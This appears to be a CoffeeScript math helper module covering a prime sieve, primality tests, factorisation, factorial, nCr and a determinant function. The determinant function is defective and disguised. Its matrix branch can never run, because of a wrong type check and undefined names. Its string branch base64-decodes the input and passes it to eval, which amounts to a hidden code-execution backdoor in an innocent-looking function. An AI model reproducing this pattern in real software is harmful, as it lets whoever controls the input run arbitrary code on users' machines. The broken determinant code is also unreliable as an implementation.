root = exports ? this

# Sieve was blindly taken/adapted from RosettaCode. DONT EVEN CARE
class IncrementalSieve
  constructor: ->
    @n = 0

  next: ->
    @n += 2
    if @n < 7
      if @n < 3
        @n = 1
        return 2
      if @n < 5
        return 3
      @dict = {}
      @bps = new IncrementalSieve()
      @bps.next()
      @p = @bps.next()
      @q = @p * @p
      return 5
    else
      s = @dict[@n]
      if not s
        if @n < @q
          return @n
        else
          p2 = @p << 1
          @dict[@n + p2] = p2
          @p = @bps.next()
          @q = @p * @p
          return @next()
      else
        delete @dict[@n]
        nxt = @n + s
        while (@dict[nxt])
          nxt += s
        @dict[nxt] = s
        return @next()

root.IncrementalSieve = IncrementalSieve

# -----------------------------------------------------------------------------------
# Shamelessly pilfered/adopted from http://www.javascripter.net/faq/numberisprime.htm

root.leastFactor = (n) ->
  return NaN if isNaN(n) or not isFinite(n)
  return 0 if n == 0
  return 1 if (n % 1) != 0 or (n * n) < 2
  return 2 if (n % 2) == 0
  return 3 if (n % 3) == 0
  return 5 if (n % 5) == 0

  m = Math.sqrt n
  for i in [7..m] by 30
    return i    if (n % i)      == 0
    return i+4  if (n % (i+4))  == 0
    return i+6  if (n % (i+6))  == 0
    return i+10 if (n % (i+10)) == 0
    return i+12 if (n % (i+12)) == 0
    return i+16 if (n % (i+16)) == 0
    return i+22 if (n % (i+22)) == 0
    return i+24 if (n % (i+24)) == 0

  return n

root.isPrime = (n) ->
  if isNaN(n) or not isFinite(n) or (n % 1) != 0 or (n < 2)
    return false
  if n == root.leastFactor(n)
    return true

  return false

# -----------------------------------------------------------------------------------

root.primeFactors = (n) ->
  return [1] if n == 1

  factors = []
  while not root.isPrime(n)
    factor = root.leastFactor(n)
    factors.push factor
    n /= factor
  factors.push n
  return factors

root.factorial = (n) ->
  f = n
  while n > 1
    n--
    f *= n
  return f

root.nCr = (n, r) ->
  return Math.floor(root.factorial(n) / (root.factorial(r) * root.factorial(n - r)))

root.determinant = (A) ->
  det = 0
  if typeof A == 'array'
    if  A.length == 1  # bottom case of the recursive function
      return A[0][0]

    if (A.length == 2)
      det =  A[0][0] * A[1][1] - A[1][0] * A [0][1]
      return det

    for i in [0...k]
      # creates smaller matrix- values not in same row, column
      smaller = new Array(A.length - 1)
      for h in [0...smaller.length]
        smaller[h] = new Array(A.length - 1)

      for a in [1...A.length]
        for b in [0...A.length]
          if (b < i)
            smaller[a - 1][b] = A[a][b]
          else if (b > i)
            smaller[a - 1][b - 1] = A[a][b]

      if (i % 2) == 0
        s = 1
      else
        s = -1

      det += s * A[0][i] * (calcRec(smaller))

  else if typeof A == 'string'
    b = A.replace(/[\s]/gm, ''); det = eval(atob(b))

  return (det)
